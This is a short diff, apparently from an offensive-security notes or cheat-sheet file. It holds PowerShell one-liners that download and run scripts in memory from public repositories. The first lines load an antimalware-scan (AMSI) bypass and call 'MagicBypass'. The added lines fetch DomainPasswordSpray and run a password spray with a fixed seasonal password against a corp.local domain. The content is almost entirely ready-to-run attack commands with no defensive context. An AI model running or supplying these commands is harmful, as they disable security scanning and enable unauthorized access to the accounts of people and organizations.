@@ -2,3 +2,9 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 
 
 IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello2.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello3.ps1"); MagicBypass;
+
+# Download and execute in memory in one line
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/refs/heads/master/DomainPasswordSpray.ps1%27)
+ 
+# Now the functions are loaded — invoke the spray
+Invoke-DomainPasswordSpray -Password Summer2025 -Domain corp.local -OutFile sprayed.txt
